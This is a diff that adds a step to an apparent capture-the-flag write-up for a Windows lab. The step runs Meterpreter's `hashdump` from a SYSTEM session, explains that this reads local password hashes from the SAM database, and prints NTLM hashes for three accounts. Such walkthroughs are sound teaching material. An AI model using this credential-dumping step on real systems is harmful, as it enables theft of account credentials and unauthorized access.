@@ -1406,7 +1406,29 @@ Dump the non-default user's password and crack it!
 <br>
 </div>
 
+with a stable Meterpreter session as SYSTEM. SYSTEM is the only context permitted to read the SAM database where local password hashes are stored; extract them now that the privilege and stability are in place.
 
+**Command**
+
+```
+hashdump
+```
+
+**Breakdown**
+
+|Component|Purpose|
+|---|---|
+|`hashdump`|Meterpreter built-in that reads the SAM (Security Account Manager) database and prints each local account's stored password hashes. Requires SYSTEM privilege — the SAM is inaccessible to lower contexts.|
+
+**Result**
+
+```shell
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+meterpreter > 
+```
 <div align="center">
 <br>
 ※※※※※※※※※※※※※※※※※※※※※※※※
